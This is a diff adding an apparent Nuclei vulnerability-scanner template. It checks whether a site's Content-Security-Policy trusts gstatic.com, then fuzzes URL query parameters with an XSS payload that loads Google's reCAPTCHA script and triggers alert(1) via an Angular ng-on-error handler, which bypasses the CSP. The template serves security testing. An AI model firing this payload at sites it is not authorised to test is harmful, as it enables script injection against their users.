@@ -1,0 +1,55 @@
+id: gstatic-recaptcha-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - GStatic reCAPTCHA
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,gstatic-recaptcha,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "gstatic.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: gstatic_recaptcha_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.gstatic.com/recaptcha/about/js/main.min.js"></script><img src=x ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "gstatic_recaptcha_csp_xss == true"
+# digest: 4a0a00473045022053e48d885662675efef81f8f6bd9678f13dc953f42c2bda4d1241a6f2671f415022100cfb20a9ff345935240ec301f202e136e5756172cb79f6c87ab95658ccf7537fd:922c64590222798bb761d5b6d8e72950
